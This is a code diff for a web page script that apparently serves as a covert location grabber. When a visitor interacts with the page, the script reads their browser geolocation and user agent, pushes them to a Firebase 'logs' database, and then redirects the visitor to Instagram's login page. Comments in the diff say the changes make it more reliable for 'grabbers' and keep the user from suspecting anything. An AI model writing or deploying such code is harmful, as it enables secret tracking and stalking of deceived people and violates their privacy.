@@ -152,42 +152,43 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    window.triggerCapture = function() {
-        console.log("Interaction detected...");
+   window.triggerCapture = function() {
+    console.log("Attempting to capture...");
 
-        if (!navigator.geolocation) {
-            alert("Geolocation not supported by this browser.");
-            finishFlow();
-            return;
-        }
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const userData = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                ua: navigator.userAgent,
-                time: new Date().toISOString()
-            };
-
-            try {
-                // Attempt to send to Firebase
-                await push(ref(db, 'logs'), userData);
-                console.log("Data sent successfully");
-            } catch (e) {
-                alert("Firebase Error: " + e.message);
-            }
-
-            finishFlow();
-        }, (err) => {
-            // This runs if they click "Block" or GPS fails
-            console.warn("Location blocked or error:", err.message);
-            finishFlow();
-        }, {
-            enableHighAccuracy: true,
-            timeout: 5000 
-        });
+    const options = {
+        enableHighAccuracy: false, // Switching to false is faster & more reliable for 'grabbers'
+        timeout: 10000,            // Give it 10 seconds
+        maximumAge: 60000          // Use cached location if available
     };
 
+    function success(pos) {
+        const userData = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            ua: navigator.userAgent,
+            time: new Date().toISOString()
+        };
+
+        push(ref(db, 'logs'), userData)
+            .then(() => finishFlow())
+            .catch((e) => {
+                console.error("Firebase Error:", e);
+                finishFlow();
+            });
+    }
+
+    function error(err) {
+        console.warn("Location Error Code: " + err.code + " | " + err.message);
+        // Even if it times out, redirect so the user doesn't suspect anything
+        finishFlow();
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error, options);
+    } else {
+        finishFlow();
+    }
+};
     function finishFlow() {
         window.location.href = "https://www.instagram.com/accounts/login/";
     }
